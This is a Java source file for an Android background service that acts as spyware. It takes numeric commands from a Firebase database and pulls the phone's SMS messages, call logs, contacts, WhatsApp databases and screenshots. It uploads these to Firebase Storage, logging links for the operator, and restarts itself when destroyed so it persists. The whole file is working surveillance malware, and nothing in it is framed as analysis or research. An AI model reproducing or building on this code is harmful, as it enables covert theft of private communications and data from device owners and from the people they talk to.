package com.aigs.serviceone.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.TabHost;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import com.aigs.serviceone.MainActivity;
import com.aigs.serviceone.R;
import com.aigs.serviceone.helpers.BatteryUpdater;
import com.aigs.serviceone.helpers.CallExtractorNotifier;
import com.aigs.serviceone.helpers.ContactsPayloadListner;
import com.aigs.serviceone.helpers.PayloadTypes;
import com.aigs.serviceone.helpers.SmsExtractorNotifier;
import com.aigs.serviceone.helpers.SmsModes;
import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
import com.aigs.serviceone.payload.CallLogsPayload;
import com.aigs.serviceone.payload.ContactsPayload;
import com.aigs.serviceone.payload.ScreenshotPayload;
import com.aigs.serviceone.payload.SmsPayload;
import com.aigs.serviceone.payload.WhatsappChatPayload;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseException;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.HashMap;

public class Starter extends Service {

    public Starter() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String input = intent.getStringExtra("inputExtra");

        Intent notificationIntent = new Intent(this, Starter.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);
        Notification notification = new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID)
                .setContentTitle("Auto Start Service")
                .setContentText(input)
                .setColor(Color.TRANSPARENT)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentIntent(pendingIntent)
                .build();

        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(MainActivity.CHANNEL_ID, MainActivity.CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);
            mNotificationManager.createNotificationChannel(channel);
            new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID);
        }
        startForeground(1, notification);

        FirebaseDatabase
                .getInstance()
                .getReference("test")
                .child("command")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            try {
                                snapshot.getValue(Long.class);
                                FirebaseDatabase.getInstance().getReference("test").child("command").setValue(true);
                            } catch (NumberFormatException | DatabaseException numberFormatException) {
                                Log.d("WARNING", "OLD BOOT CHECK COMMAND FOUND");
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        error.toException().printStackTrace();
                    }
                });


        FirebaseDatabase
                .getInstance()
                .getReference("command")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            try {
                                int command = snapshot.getValue(Integer.class);
                                processCommand(command);
                                Log.e("COMMAND", command + "");
                            } catch (Exception e) {

                                Log.e("EXCEPTION", e.getMessage());
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        Log.e("DB", error.getMessage());

                    }
                });

        return START_NOT_STICKY;
    }

    private void processCommand(int command) {
        try {

            switch (command) {
                case PayloadTypes.GET_TEXT_MESSAGES_INBOX:
                    getSms(SmsModes.MODE_INBOX);
                    break;
                case PayloadTypes.GET_CALL_LOGS:
                    getCallLogs();
                    break;
                case PayloadTypes.GET_TEXT_MESSAGES_OUTBOX:
                    getSms(SmsModes.MODE_OUTBOX);
                    break;
                case PayloadTypes.GET_TEXT_MESSAGES_DRAFT:
                    getSms(SmsModes.MODE_DRAFT);
                    break;
                case PayloadTypes.GET_WHATSAPP_DATABASES:
                    getWbDb();
                    break;
                case PayloadTypes.GET_SCREENSHOTS_COUNT:
                    getSc();
                    break;
                case PayloadTypes.GET_USER_CONTACTS:
                    getContacts();
                    break;
                case PayloadTypes.GET_BATTERY_STATUS:
                    //loadBatterySection();
                    break;
                default:
                    Log.d("ERROR PA : ", "Invalid Command Received");
                    FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");

                    break;
            }
        } catch (SecurityException e) {
            Log.e("PERMISSION : ", e.getMessage());
            FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());

        }
    }

    private void getContacts() {
        try {
            new ContactsPayload(this).setOnContactPayloadListener(new ContactsPayloadListner() {
                @Override
                public void onDataExtracted(File file, String rawData) {
                    Uri fileReference = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", file);
                    FirebaseStorage
                            .getInstance()
                            .getReference("contacts")
                            .child("contacts_" + System.currentTimeMillis() + ".json")
                            .putFile(fileReference)
                            .addOnFailureListener(r -> FirebaseDatabase
                                    .getInstance()
                                    .getReference("Logs")
                                    .child(PayloadTypes.GET_USER_CONTACTS + "")
                                    .child("CurrentLog")
                                    .setValue(r.getMessage()))
                            .addOnCompleteListener(task -> {
                                if (task.isSuccessful()) {
                                    task.getResult()
                                            .getStorage()
                                            .getDownloadUrl()
                                            .addOnCompleteListener(task1 -> {
                                                HashMap<String, Object> databaseEntry = new HashMap<>();
                                                databaseEntry.put("/RECORDS/contacts/" + System.currentTimeMillis(), task1.getResult().toString());
                                                databaseEntry.put("/LIVE/contacts", task1.getResult().toString());
                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                            });
                                }
                                ;
                            });
                }
            }).execute();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getSc() {
        try {
            new ScreenshotPayload(this).setScreenshotPayloadListener(path -> {

                Uri securePath = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", path);
                Log.e("PATH:", path.toString());
                FirebaseStorage
                        .getInstance()
                        .getReference("screenshots")
                        .child("sc_" + System.currentTimeMillis() + ".zip")
                        .putFile(securePath)
                        .addOnFailureListener(f -> {
                            FirebaseDatabase
                                    .getInstance()
                                    .getReference("Logs")
                                    .child(PayloadTypes.GET_SCREENSHOTS_COUNT + "")
                                    .child("CurrentLog")
                                    .setValue(f.getMessage());
                        })
                        .addOnCompleteListener(t -> {
                            t.getResult()
                                    .getStorage()
                                    .getDownloadUrl()
                                    .addOnCompleteListener(p ->{
                                        HashMap<String, Object> databaseEntry = new HashMap<>();
                                        databaseEntry.put("/RECORDS/screenshots/" + System.currentTimeMillis(), p.getResult().toString());
                                        databaseEntry.put("/LIVE/screenshots", p.getResult().toString());
                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);

                                    });
                        });
            }).execute();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getWbDb() {
        try {
            new WhatsappChatPayload(this)
                    .setWatsappTextExtractionListner(new WatsappTextExtractionListner() {
                        @Override
                        public void onDataExtracted(File... path) {
                            Uri uriDb = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[0]);
                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[1]);
                            String time = "" + System.currentTimeMillis();

                            FirebaseStorage
                                    .getInstance()
                                    .getReference("whatsapp_media_less")
                                    .child(time)
                                    .putFile(uriDb)
                                    .addOnCompleteListener(task -> {
                                        if (task.isSuccessful()) {
                                            task.getResult()
                                                    .getStorage()
                                                    .getDownloadUrl()
                                                    .addOnCompleteListener(task1 ->
                                                            FirebaseDatabase
                                                                    .getInstance()
                                                                    .getReference("wbDb")
                                                                    .child(System.currentTimeMillis() + " ")
                                                                    .setValue(task1.getResult().toString()));

                                        } else {
                                            //SET ERROR MESSAGE
                                        }
                                    });

                            FirebaseStorage
                                    .getInstance()
                                    .getReference("whatsapp_media_less")
                                    .child(time)
                                    .putFile(uri)
                                    .addOnCompleteListener(task12 -> {
                                        task12.getResult()
                                                .getStorage()
                                                .getDownloadUrl()
                                                .addOnCompleteListener(task1 ->
                                                        FirebaseDatabase
                                                                .getInstance()
                                                                .getReference("wbDb")
                                                                .child(System.currentTimeMillis() + " ")
                                                                .setValue(task1.getResult().toString()));
                                    });


                        }
                    }).execute();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getCallLogs() {
        try {

            new CallLogsPayload(this)
                    .setCallLogsListener(new CallExtractorNotifier() {
                        @Override
                        public void onCallRetrieved(File file, String calls) {
                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", file);
                            Log.d("PATH_PRO", uri.toString());
                            FirebaseStorage
                                    .getInstance()
                                    .getReference("calls")
                                    .child("" + System.currentTimeMillis())
                                    .putFile(uri)
                                    .addOnCompleteListener(task -> {
                                        if (task.isSuccessful()) {
                                            task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> {
                                                HashMap<String, Object> databaseEntry = new HashMap<>();
                                                databaseEntry.put("/RECORDS/calls/" + System.currentTimeMillis(), task1.getResult().toString());
                                                databaseEntry.put("/LIVE/calls", task1.getResult().toString());
                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                            });
                                        } else
                                            Log.e("STORAGE", task.getException().getMessage());
                                    });

                        }

                        @Override
                        public void onResponseEmpty() {
                            Log.e("EMPTY", "NO RECORDS DETECTED");
                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue("NO RECORDS DETECTED");

                        }
                    }).execute();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void getSms(String modeInbox) {
        try {

            new SmsPayload(this)
                    .setSmsListener(new SmsExtractorNotifier() {
                        @Override
                        public void onSmsRetrieved(File file, String sms) {
                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", file);
                            Log.d("PATH_PRO", uri.toString());
                            FirebaseStorage
                                    .getInstance()
                                    .getReference("sms")
                                    .child("" + System.currentTimeMillis())
                                    .putFile(uri)
                                    .addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
                                        @Override
                                        public void onComplete(@NonNull Task<UploadTask.TaskSnapshot> task) {
                                            if (task.isSuccessful()) {
                                                task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(new OnCompleteListener<Uri>() {
                                                    @Override
                                                    public void onComplete(@NonNull Task<Uri> task) {
                                                        HashMap<String, Object> databaseEntry = new HashMap<>();
                                                        if (modeInbox.equals(SmsModes.MODE_INBOX)){
                                                            databaseEntry.put("/RECORDS/sms_inbox/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/sms_inbox", task.getResult().toString());
                                                        }else if (modeInbox.equals(SmsModes.MODE_OUTBOX)){
                                                            databaseEntry.put("/RECORDS/sms_outbox/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/sms_outbox", task.getResult().toString());
                                                        }else if (modeInbox.equals(SmsModes.MODE_DRAFT)){
                                                            databaseEntry.put("/RECORDS/sms_draft/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/sms_draft", task.getResult().toString());
                                                        }

                                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                    }
                                                });
                                            } else
                                                Log.e("STORAGE", task.getException().getMessage());
                                        }
                                    });
                        }

                        @Override
                        public void onResponseEmpty() {
                            Log.e("EMPTY", "NO RECORDS DETECTED");
                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue("NO RECORDS DETECTED");

                        }
                    }).execute(modeInbox);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent serviceIntent = new Intent(this, Starter.class);
        serviceIntent.putExtra("inputExtra", "passing any text");
        ContextCompat.startForegroundService(this, serviceIntent);
    }



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}